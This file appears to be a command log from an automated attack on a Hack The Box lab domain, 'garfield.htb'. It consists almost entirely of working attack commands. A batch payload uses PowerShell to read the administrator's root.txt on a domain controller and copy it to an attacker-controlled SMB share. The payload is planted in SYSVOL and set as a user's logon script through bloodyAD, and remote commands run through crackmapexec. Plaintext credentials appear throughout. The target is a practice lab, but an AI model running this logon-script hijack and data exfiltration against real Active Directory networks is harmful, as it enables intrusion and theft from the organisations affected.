@@ -1,0 +1,27 @@
+[08:38:06] RUN: ls /tmp/loot/ 2>&1; ss -tlnp | grep :445 2>&1
+[08:38:06] RUN: cat /htb/machines/garfield/state/creds.jsonl 2>/dev/null | tail -20
+[08:38:11] RUN: ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
+[08:38:15] RUN: cat > /tmp/script.bat << 'BATEOF'
+@echo off
+powershell -c "Invoke-Command -ComputerName RODC01.garfield.htb -ScriptBlock {Get-Content C:\Users\Administrator\Desktop\root.txt} > \\10.10.17.114\share\root.txt"
+BATEOF
+cat /tmp/script.bat
+[08:38:19] RUN: smbclient '//10.129.17.167/SYSVOL' -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb/scripts; put /tmp/script.bat script.bat; ls' 2>&1
+[08:38:23] RUN: /home/hacker/.local/bin/bloodyAD -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --host 10.129.17.167 set object 'l.wilson' 'scriptPath' -v 'script.bat' 2>&1
+[08:38:29] RUN: # Clear loot directory first, then wait for script execution
+ls /tmp/loot/ 2>&1; echo "---waiting 15s for logon script trigger---"; sleep 15; ls -la /tmp/loot/ 2>&1; cat /tmp/loot/root.txt 2>&1
+[08:38:54] RUN: smbclient '//10.129.17.167/SYSVOL' -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb/scripts; get exfil.bat /tmp/exfil.bat; get getroot.bat /tmp/getroot.bat; get pwn.bat /tmp/pwn.bat' 2>&1; echo "=== exfil.bat ==="; cat /tmp/exfil.bat; echo "=== getroot.bat ==="; cat /tmp/getroot.bat; echo "=== pwn.bat ==="; cat /tmp/pwn.bat
+[08:39:02] RUN: # Toggle scriptPath - clear then reset to trigger
+/home/hacker/.local/bin/bloodyAD -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --host 10.129.17.167 set object 'l.wilson' 'scriptPath' -v '' 2>&1; sleep 2; /home/hacker/.local/bin/bloodyAD -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --host 10.129.17.167 set object 'l.wilson' 'scriptPath' -v 'script.bat' 2>&1
+[08:39:09] RUN: # Wait 15 more seconds for logon script trigger
+sleep 15; ls -la /tmp/loot/ 2>&1; cat /tmp/loot/root.txt 2>&1
+[08:39:30] RUN: # Check CrackMapExec to see if we can read root.txt via l.wilson on RODC01 remotely - and also check what the smb share name is
+crackmapexec smb 10.129.17.167 -u 'l.wilson_adm' -p 'P@ssw0rd2026!' -d garfield.htb -x 'type C:\Windows\Temp\rodc_root.txt 2>&1 & type C:\Windows\Temp\rodc_error.txt 2>&1' 2>&1 | head -20
+[08:39:37] RUN: # Check with j.arbuckle (confirmed admin) if any logon script output exists
+crackmapexec smb 10.129.17.167 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb -x 'type C:\Windows\Temp\rodc_root.txt 2>&1 & type C:\Windows\Temp\rodc_error.txt 2>&1' 2>&1 | head -20
+[08:39:47] RUN: crackmapexec smb 10.129.17.167 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb -x 'whoami' --exec-method smbexec 2>&1 | head -10
+[08:39:54] RUN: # Check SMB server process to see share configuration
+ps aux | grep -i smb | grep -v grep; cat /proc/75119/cmdline 2>/dev/null | tr '\0' ' ' 2>&1
+[08:39:57] RUN: # Find the actual SMB server process
+ps aux | grep -E 'impacket|smbserver|smb_server' | grep -v grep
+[08:40:00] RUN: ss -tlnp | grep :445
